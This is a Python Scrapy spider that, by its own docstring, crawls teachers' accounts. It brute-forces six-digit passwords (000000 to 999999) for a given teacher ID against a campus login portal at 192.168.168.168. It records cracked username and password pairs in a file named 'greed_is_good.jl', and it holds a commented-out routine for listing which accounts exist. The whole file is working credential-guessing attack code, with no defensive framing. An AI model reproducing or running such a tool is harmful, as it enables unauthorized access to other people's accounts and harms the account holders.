# -*- coding: utf-8 -*-
"""crawl teachers' account"""
import re
import scrapy
from scrapy.extensions.closespider import CloseSpider
try:
    from items import DrComItem as Item
except ImportError as err:
    raise err

class SascSpider(scrapy.Spider):
    """ give the spider a username and passwords
    (from 000000 to 999999)"""
    name = 'sasc'

    def __init__(self, **kwargs):
        """
        :username: teacher's id
        :passwords: splited from 000000 to 999999
        """

        try:
            self.username = kwargs['username']  # get username from run.py
            self.passwords = kwargs['passwords']  # get passwords from run.py
        except KeyError as err:  # whether they are existed
            print(err, " Maybe you havn't finish run.py or your usernames, passwords "
                  "is not right")
            raise err

        self.start_urls = ['http://192.168.168.168/0.htm']

        # 'DDDDD' is the tag input/@name attributes for username
        # 'upass' is the input/@name attributes for password
        self.formdata = {"DDDDD": str(self.username), 'upass': ''}

        # find the password from response
        self.password_re = re.compile('[0-9]{6}')

        super(SascSpider, self).__init__()

    def parse(self, response):
        """post the formdatas(username and password) to the website"""
        for password in self.passwords:
            self.formdata['upass'] = password
            yield scrapy.FormRequest.from_response(response=response, formdata=self.formdata,
                                                    callback=self.check_parse)

    def check_parse(self, response):
        """The codes below use for saving existed accounts to generate.txt. If you havn't
        create the generate.txt, you need to indent 4 spaces for the remaining codes to
        make them in the `else` clause"""
        """
        script = ''.join(response.xpath('//script/text()').extract())
        if 'modify' in script[200:350]:
            self.logger.info('%s is unexisted', self.username)
            return {}
        else:  # indent in this `else` clause
            with open('generate.txt', mode='a+') as f:
                f.write(self.username + '\n')
        # used to indent 4 spaces to create 'generate.txt'
        """
        body = str(response.request.body)
        status = response.xpath('//input/@value').extract()
        result = ''.join(map(str, status))
        password = self.password_re.findall(body)[-1]
        if '\u8fd4' in result:
            self.logger.info('password %s is useless for %s',
                             password, self.username)
            yield None
        elif result == "":
            self.logger.info('password %s login %s successfully' + '!'*15, password, self.username)
            item = Item()
            item['username'] = self.username
            item['password'] = password
            with open('greed_is_good.jl', mode='a+') as f:
                f.write("{%s: %s}\n" % (self.username, password))
            yield item
            CloseSpider(crawler=self.crawler)
        else:
            self.logger.error('password %s is unknown for %s', password, self.username)
            with open('error_occured.jl', mode='a+') as f:
                f.write("{%s: %s}\n" % (self.username, password))
            yield None
